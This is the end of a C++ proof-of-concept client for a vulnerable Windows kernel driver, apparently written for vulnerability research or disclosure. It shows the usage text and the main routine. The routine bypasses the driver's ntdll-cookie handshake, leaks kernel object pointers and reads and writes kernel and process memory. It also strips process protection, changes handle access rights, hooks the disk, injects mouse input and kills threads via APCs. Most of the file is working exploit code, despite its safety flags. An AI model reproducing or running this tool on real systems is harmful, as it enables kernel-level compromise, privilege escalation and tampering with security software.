    printf("  --kill-thread TID    0x220032 APC -> PsTerminateSystemThread\n");
    printf("  --delay-apc TID MS   0x220042 delay APC\n");
    printf("  --set-offsets HEX    0x22004E exactly 0x3C bytes (--keep-offsets to keep)\n");
    printf("  --allow-foreign-thread   permit APCs into other processes\n\n");
    printf("other:\n");
    printf("  process.exe          target for the read-only sweep (default explorer.exe)\n");
    printf("  --pid N              target by PID instead of by name\n");
    printf("  --list               print the full IOCTL surface and exit\n");
    printf("  --help               this text\n\n");
    printf("examples:\n");
    printf("  poc_p2KGhmzs.exe\n");
    printf("  poc_p2KGhmzs.exe notepad.exe --walk\n");
    printf("  poc_p2KGhmzs.exe --dump-offsets\n");
    printf("  poc_p2KGhmzs.exe notepad.exe --read 0x7FF600000000 0x40\n");
    printf("  poc_p2KGhmzs.exe --kernel-read 0xFFFFF78000000000 0x40\n");
}

// -----------------------------------------------------------------------------
//  main
// -----------------------------------------------------------------------------
int main(int argc, char** argv)
{
    setvbuf(stdout, nullptr, _IONBF, 0);

    const char* targetName = "explorer.exe";
    UINT32 targetPidOpt = 0;
    bool unsafe = false;
    bool iMeanIt = false;
    bool allowForeign = false;

    bool doProtect = false, doUnprotect = false;
    UINT32 protectPid = 0;
    bool doArmUnload = false;
    bool doPhysDemo = false;

    bool doWalk = false;
    bool doDumpOffsets = false;
    bool doPoolScan = false;
    bool doMouse = false;
    bool doDiskHook = false;
    int  diskHookMode = 2;               // 2 = hook + restore
    bool doKillThread = false;
    bool doDelayApc = false;
    bool doHandleAccess = false;
    bool doTableCall = false;

    bool haveKernelRead = false;
    UINT64 kernelReadAddr = 0;
    UINT32 kernelReadSize = 0x40;

    bool haveKernelWrite = false;
    UINT64 kernelWriteAddr = 0;
    std::vector<unsigned char> kernelWriteData;

    bool haveRead = false;
    UINT64 readAddr = 0;
    UINT32 readSize = 0x40;

    bool haveWrite = false;
    UINT64 writeAddr = 0;
    std::vector<unsigned char> writeData;

    bool haveRefHandle = false;
    UINT32 refHandle = 0;

    UINT32 handlePid = 0;
    UINT64 handleValue = 0;
    UINT64 handleAccess = 0;

    std::string tableModule;
    UINT64 tableArgs[3] = {};

    UINT32 mouseButtons = 1, mouseLastY = 0;
    UINT16 mouseBtnFlags = 0, mouseFlags = 0;

    UINT32 killTid = 0;
    UINT32 delayTid = 0;
    UINT64 delayMs = 0;

    bool haveSetOffsets = false;
    bool keepOffsets = false;
    std::vector<unsigned char> offsetsData;

    for (int i = 1; i < argc; ++i) {
        const char* a = argv[i];
        if (!_stricmp(a, "--help") || !_stricmp(a, "-h") || !_stricmp(a, "/?")) {
            Usage();
            return 0;
        }
        if (!_stricmp(a, "--list")) {
            CmdList();
            return 0;
        }
        if (!_stricmp(a, "--unsafe"))   { unsafe = true; continue; }
        if (!_stricmp(a, "--i-mean-it")) { iMeanIt = true; continue; }
        if (!_stricmp(a, "--allow-foreign-thread")) { allowForeign = true; continue; }

        if (!_stricmp(a, "--pid")) {
            if (i + 1 >= argc) { printf("[-] --pid needs a value\n"); return 1; }
            targetPidOpt = static_cast<UINT32>(ParseU64(argv[++i]));
            continue;
        }
        if (!_stricmp(a, "--kernel-read")) {
            if (i + 1 >= argc) { printf("[-] --kernel-read needs an address\n"); return 1; }
            kernelReadAddr = ParseU64(argv[++i]);
            if (i + 1 < argc && argv[i + 1][0] != '-')
                kernelReadSize = static_cast<UINT32>(ParseU64(argv[++i]));
            haveKernelRead = true;
            continue;
        }
        if (!_stricmp(a, "--kernel-write")) {
            if (i + 2 >= argc) { printf("[-] --kernel-write needs address and hex bytes\n"); return 1; }
            kernelWriteAddr = ParseU64(argv[++i]);
            if (!ParseHexBytes(argv[++i], kernelWriteData)) {
                printf("[-] --kernel-write expects hex bytes like 90-90-CC\n");
                return 1;
            }
            haveKernelWrite = true;
            continue;
        }
        if (!_stricmp(a, "--read")) {
            if (i + 1 >= argc) { printf("[-] --read needs an address\n"); return 1; }
            readAddr = ParseU64(argv[++i]);
            if (i + 1 < argc && argv[i + 1][0] != '-')
                readSize = static_cast<UINT32>(ParseU64(argv[++i]));
            haveRead = true;
            continue;
        }
        if (!_stricmp(a, "--write")) {
            if (i + 2 >= argc) { printf("[-] --write needs address and hex bytes\n"); return 1; }
            writeAddr = ParseU64(argv[++i]);
            if (!ParseHexBytes(argv[++i], writeData)) {
                printf("[-] --write expects hex bytes like 90-90-CC\n");
                return 1;
            }
            haveWrite = true;
            continue;
        }
        if (!_stricmp(a, "--phys-demo"))   { doPhysDemo = true; continue; }
        if (!_stricmp(a, "--arm-unload"))  { doArmUnload = true; continue; }
        if (!_stricmp(a, "--walk"))        { doWalk = true; continue; }
        if (!_stricmp(a, "--dump-offsets")){ doDumpOffsets = true; continue; }
        if (!_stricmp(a, "--keep-offsets")){ keepOffsets = true; continue; }
        if (!_stricmp(a, "--pool-scan"))   { doPoolScan = true; continue; }

        if (!_stricmp(a, "--ref-handle")) {
            if (i + 1 >= argc) { printf("[-] --ref-handle needs a handle value\n"); return 1; }
            refHandle = static_cast<UINT32>(ParseU64(argv[++i]));
            haveRefHandle = true;
            continue;
        }
        if (!_stricmp(a, "--patch-handle") || !_stricmp(a, "--enum-handles")) {
            if (i + 3 >= argc) {
                printf("[-] --patch-handle needs PID HANDLE ACCESS\n");
                return 1;
            }
            handlePid    = static_cast<UINT32>(ParseU64(argv[++i]));
            handleValue  = ParseU64(argv[++i]);
            handleAccess = ParseU64(argv[++i]);
            doHandleAccess = true;
            continue;
        }
        if (!_stricmp(a, "--table-call")) {
            if (i + 4 >= argc) {
                printf("[-] --table-call needs MODULE A1 A2 A3\n");
                return 1;
            }
            tableModule = argv[++i];
            tableArgs[0] = ParseU64(argv[++i]);
            tableArgs[1] = ParseU64(argv[++i]);
            tableArgs[2] = ParseU64(argv[++i]);
            doTableCall = true;
            continue;
        }
        if (!_stricmp(a, "--mouse")) {
            if (i + 4 >= argc) {
                printf("[-] --mouse needs BUTTONS LASTY BTNFLAGS FLAGS\n");
                return 1;
            }
            mouseButtons  = static_cast<UINT32>(ParseU64(argv[++i]));
            mouseLastY    = static_cast<UINT32>(ParseU64(argv[++i]));
            mouseBtnFlags = static_cast<UINT16>(ParseU64(argv[++i]));
            mouseFlags    = static_cast<UINT16>(ParseU64(argv[++i]));
            doMouse = true;
            continue;
        }
        if (!_stricmp(a, "--disk-hook")) {
            doDiskHook = true;
            diskHookMode = 2;
            if (i + 1 < argc && argv[i + 1][0] != '-') {
                const char* m = argv[++i];
                if (!_stricmp(m, "hook"))         diskHookMode = 0;
                else if (!_stricmp(m, "restore")) diskHookMode = 1;
                else if (!_stricmp(m, "roundtrip")) diskHookMode = 2;
                else { printf("[-] --disk-hook expects hook|restore|roundtrip\n"); return 1; }
            }
            continue;
        }
        if (!_stricmp(a, "--kill-thread")) {
            if (i + 1 >= argc) { printf("[-] --kill-thread needs a TID\n"); return 1; }
            killTid = static_cast<UINT32>(ParseU64(argv[++i]));
            doKillThread = true;
            continue;
        }
        if (!_stricmp(a, "--delay-apc")) {
            if (i + 2 >= argc) { printf("[-] --delay-apc needs TID MS\n"); return 1; }
            delayTid = static_cast<UINT32>(ParseU64(argv[++i]));
            delayMs  = ParseU64(argv[++i]);
            doDelayApc = true;
            continue;
        }
        if (!_stricmp(a, "--set-offsets")) {
            if (i + 1 >= argc) { printf("[-] --set-offsets needs 0x3C hex bytes\n"); return 1; }
            if (!ParseHexBytes(argv[++i], offsetsData)) {
                printf("[-] --set-offsets expects hex bytes like 05-00-00-...\n");
                return 1;
            }
            haveSetOffsets = true;
            continue;
        }
        if (!_stricmp(a, "--protect")) {
            doProtect = true;
            if (i + 1 < argc && argv[i + 1][0] != '-')
                protectPid = static_cast<UINT32>(ParseU64(argv[++i]));
            continue;
        }
        if (!_stricmp(a, "--unprotect")) {
            doUnprotect = true;
            if (i + 1 < argc && argv[i + 1][0] != '-')
                protectPid = static_cast<UINT32>(ParseU64(argv[++i]));
            continue;
        }
        if (a[0] == '-') {
            printf("[-] unknown option '%s' (try --help)\n", a);
            return 1;
        }
        targetName = a;
    }

    printf("poc_p2KGhmzs - user-mode client for p2KGhmzsARY1.sys\n");
    printf("  device   : %ls\n", kDevicePath);
    printf("  sha256   : 4473fef2a90a3217db685de44f575d2586666fcf3db7fa9efa1328afcdbf34a8\n");
    printf("  mode     : %s\n", unsafe ? "WRITE ALLOWED (--unsafe)" : "read-only (default)");
    printf("\n");

    OsBuildNumber();

    // Only needed for OpenProcess on protected / AppContainer targets; the
    // driver-side reads do not care about target protection.
    if (EnableDebugPrivilege())
        printf("[+] SeDebugPrivilege enabled\n");
    else
        printf("[!] SeDebugPrivilege not available (target may refuse OpenProcess)\n");

    // ---------- gate the risky options before touching the driver ----------
    const bool needBoth = haveKernelWrite || doPhysDemo || doHandleAccess ||
                          doTableCall || doDiskHook || doKillThread ||
                          doDelayApc || haveSetOffsets;
    const bool needUnsafe = needBoth || haveWrite || doProtect || doUnprotect ||
                            doArmUnload || doMouse;

    if (needBoth && (!unsafe || !iMeanIt)) {
        printf("[-] refusing: this action needs --unsafe --i-mean-it\n");
        return 2;
    }
    if (needUnsafe && !unsafe) {
        printf("[-] refusing: write/state change needs --unsafe\n");
        return 2;
    }
    if (haveKernelWrite && kernelWriteData.empty()) {
        printf("[-] empty write payload\n");
        return 2;
    }
    if (haveKernelWrite && kernelWriteData.size() > 0x1000) {
        printf("[-] write payload too large (max 0x1000)\n");
        return 2;
    }
    if (haveKernelWrite && kernelWriteAddr < kKernelBase) {
        printf("[-] 0x%016llx is not a kernel address\n",
               static_cast<unsigned long long>(kernelWriteAddr));
        return 2;
    }
    if (haveSetOffsets && offsetsData.size() != kOsOffsetsSize) {
        printf("[-] --set-offsets needs exactly 0x3C bytes (got 0x%zX)\n",
               offsetsData.size());
        return 2;
    }

    const bool anyAction = haveKernelRead || haveKernelWrite || haveRead ||
                           haveWrite || doPhysDemo || doProtect || doUnprotect ||
                           doArmUnload || doWalk || doDumpOffsets || doPoolScan ||
                           haveRefHandle || doHandleAccess || doTableCall ||
                           doMouse || doDiskHook || doKillThread || doDelayApc ||
                           haveSetOffsets;
    const bool defaultSweep = !anyAction;
    const bool needTarget = defaultSweep || doWalk || haveRead || haveWrite ||
                            ((doProtect || doUnprotect) && protectPid == 0) ||
                            (doHandleAccess && handlePid == 0);

    // ---------- bootstrap ----------
    printf("--- bootstrap (ntdll cookie handshake) ---\n");
    NtdllPatch patch{};
    if (!PatchNtdllCookie(&patch))
        return 1;

    HANDLE h = OpenDriver();
    RestoreNtdllCookie(&patch);
    if (h == INVALID_HANDLE_VALUE)
        return 1;

    // ---------- resolve the target ----------
    UINT32 targetPid = targetPidOpt;
    if (needTarget && targetPid == 0) {
        wchar_t wname[260] = {0};
        MultiByteToWideChar(CP_ACP, 0, targetName, -1, wname, 260);
        targetPid = FindPidByName(wname);
        if (targetPid == 0) {
            printf("[-] process not found: %s (use --pid N)\n", targetName);
            CloseHandle(h);
            return 1;
        }
    }
    if (targetPid)
        printf("[+] target: %s (pid %lu)\n", targetName, targetPid);
    else
        printf("[*] target not resolved (not needed by the selected action)\n");

    bool ok = true;

    // ---------- default read-only sweep ----------
    if (defaultSweep) {
        ok &= CmdConstant(h);

        UINT64 eprocess = 0;
        UINT64 ethread = 0;
        printf("\n--- 0x22003A / 0x220036  pointer leaks ---\n");
        if (LeakPointer(h, kIoctlGetProcess, targetPid, &eprocess)) {
            printf("[+] EPROCESS(pid %lu) = 0x%016llx\n", targetPid,
                   static_cast<unsigned long long>(eprocess));
        }
        if (LeakPointer(h, kIoctlGetThread, GetCurrentThreadId(), &ethread)) {
            printf("[+] ETHREAD(tid %lu)  = 0x%016llx\n", GetCurrentThreadId(),
                   static_cast<unsigned long long>(ethread));
        }

        ok &= CmdKernelReadEprocess(h, eprocess);
        ok &= CmdWalk(h, targetPid);
        ok &= CmdProcessRead(h, targetPid, targetName);
    }

    // ---------- explicit read-only actions ----------
    if (doWalk)
        ok &= CmdWalk(h, targetPid);

    if (doDumpOffsets)
        ok &= CmdDumpOffsets(h);

    if (doPoolScan)
        ok &= CmdPoolScan(h);

    if (haveRefHandle)
        ok &= CmdRefHandle(h, refHandle);

    if (haveKernelRead)
        ok &= CmdKernelReadAddr(h, kernelReadAddr, kernelReadSize);

    if (haveRead) {
        printf("\n--- 0x22001E  process read 0x%016llx (%lu bytes) ---\n",
               static_cast<unsigned long long>(readAddr), readSize);
        if (readSize == 0 || readSize > 0x1000) {
            printf("[-] bad size\n");
            ok = false;
        } else {
            std::vector<unsigned char> buf(readSize, 0);
            if (ProcessRead(h, targetPid, readAddr, buf.data(), readSize))
                HexDump(buf.data(), buf.size(), readAddr);
            else
                ok = false;
        }
    }

    // ---------- writes and state changes (already gated) ----------
    if (haveWrite) {
        ok &= CmdWriteRoundTrip(h, GetCurrentProcessId());

        printf("\n--- 0x22001E  process write 0x%016llx (%zu bytes) ---\n",
               static_cast<unsigned long long>(writeAddr), writeData.size());
        std::vector<unsigned char> original(writeData.size(), 0);
        std::vector<unsigned char> verify(writeData.size(), 0);
        if (!ProcessRead(h, targetPid, writeAddr, original.data(),
                         static_cast<UINT32>(original.size()))) {
            ok = false;
        } else {
            printf("[+] original bytes:\n");
            HexDump(original.data(), original.size(), writeAddr);
            if (ProcessWrite(h, targetPid, writeAddr, writeData.data(),
                             static_cast<UINT32>(writeData.size()))) {
                ProcessRead(h, targetPid, writeAddr, verify.data(),
                            static_cast<UINT32>(verify.size()));
                bool good = (memcmp(verify.data(), writeData.data(), verify.size()) == 0);
                printf("%s write verified\n", good ? "[+]" : "[-]");
                ProcessWrite(h, targetPid, writeAddr, original.data(),
                             static_cast<UINT32>(original.size()));
                ProcessRead(h, targetPid, writeAddr, verify.data(),
                            static_cast<UINT32>(verify.size()));
                bool restored = (memcmp(verify.data(), original.data(), verify.size()) == 0);
                printf("%s restore verified\n", restored ? "[+]" : "[-]");
                ok = ok && good && restored;
            } else {
                ok = false;
            }
        }
    }

    if (haveKernelWrite)
        ok &= CmdKernelWriteRoundTrip(h, kernelWriteAddr, kernelWriteData);

    if (doPhysDemo)
        ok &= CmdPhysDemo(h, GetCurrentProcessId());

    if (doProtect) {
        const UINT32 pid = protectPid ? protectPid : targetPid;
        ok &= CmdProtect(h, pid, true);
    }
    if (doUnprotect) {
        const UINT32 pid = protectPid ? protectPid : targetPid;
        ok &= CmdProtect(h, pid, false);
    }
    if (doArmUnload)
        ok &= CmdArmUnload(h);

    if (doHandleAccess) {
        const UINT32 pid = handlePid ? handlePid : targetPid;
        ok &= CmdHandleAccess(h, pid, handleValue, handleAccess);
    }

    if (doTableCall)
        ok &= CmdTableCall(h, tableModule.c_str(),
                           tableArgs[0], tableArgs[1], tableArgs[2]);

    if (doMouse)
        ok &= CmdMouse(h, mouseButtons, mouseLastY, mouseBtnFlags, mouseFlags);

    if (doDiskHook)
        ok &= CmdDiskHook(h, diskHookMode);

    if (doKillThread)
        ok &= CmdKillThread(h, killTid, allowForeign);

    if (doDelayApc)
        ok &= CmdDelayApc(h, delayTid, delayMs, allowForeign);

    if (haveSetOffsets)
        ok &= CmdSetOffsets(h, offsetsData, keepOffsets);

    CloseHandle(h);

    printf("\n=== Summary ===\n");
    printf("  device    : %ls (device type 0x22, METHOD_OUT_DIRECT)\n", kDevicePath);
    printf("  bootstrap : ntdll+0xFFC cookie = 2*(tid+pid)-10\n");
    if (targetPid)
        printf("  target    : %s (pid %lu)\n", targetName, targetPid);
    printf("  result    : %s\n", ok ? "ok" : "at least one step failed");
    printf("\n  read-only  : 0x22000E, 0x22001E(read), 0x22003A, 0x220036,\n");
    printf("               0x22003E, 0x22018E, g_OsOffsets dump\n");
    printf("  writes     : 0x220012, 0x22001E(write), 0x220006/0x22000A,\n");
    printf("               0x220016, 0x22004E\n");
    printf("  dangerous  : 0x220022 handle access, 0x220026 table call,\n");
    printf("               0x22002A mouse, 0x22002E disk hook,\n");
    printf("               0x220032 kill APC, 0x220042 delay APC\n");
    printf("  inert      : 0x220046 (STATUS_INVALID_DEVICE_REQUEST)\n");
    return ok ? 0 : 3;
}
